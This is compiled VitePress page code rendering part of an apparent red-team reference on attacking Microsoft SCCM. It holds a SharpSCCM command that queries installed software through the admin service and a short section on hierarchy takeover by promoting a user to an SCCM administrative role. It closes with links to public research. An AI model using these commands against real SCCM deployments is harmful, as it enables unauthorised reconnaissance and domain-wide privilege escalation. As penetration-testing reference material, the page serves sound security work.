`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"SharpSCCM.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," invoke admin"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"service "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"r  "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"q "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"InstalledSoftware"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"j")])])])],-1),i("p",null,[s("Instructions about how to write CMPivot queries are presented "),i("a",{href:"https://learn.microsoft.com/fr-fr/mem/configmgr/core/servers/manage/cmpivot",target:"_blank",rel:"noreferrer"},"here"),s(".")],-1)])),_:1})]),_:1}),e[9]||(e[9]=h('<h3 id="sccm-hierarchy-takeover" tabindex="-1">SCCM Hierarchy takeover <a class="header-anchor" href="#sccm-hierarchy-takeover" aria-label="Permalink to &quot;SCCM Hierarchy takeover&quot;">​</a></h3><p>There is nothing to do. Just promote a user to any SCCM administrative role on a primary site server (for example, <code>Full Administrator</code>), and the role will be automatically propagated to the other SCCM site in the hierarchy by the CAS.</p><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="https://www.securesystems.de/blog/active-directory-spotlight-attacking-the-microsoft-configuration-manager/" target="_blank" rel="noreferrer">https://www.securesystems.de/blog/active-directory-spotlight-attacking-the-microsoft-configuration-manager/</a></p><p><a href="https://enigma0x3.net/2016/02/" target="_blank" rel="noreferrer">https://enigma0x3.net/2016/02/</a></p><p><a href="https://posts.specterops.io/sccm-hierarchy-takeover-41929c61e087" target="_blank" rel="noreferrer">https://posts.specterops.io/sccm-hierarchy-takeover-41929c61e087</a></p>',6))])}const f=p(m,[["render",u]]);export{b as __pageData,f as default};
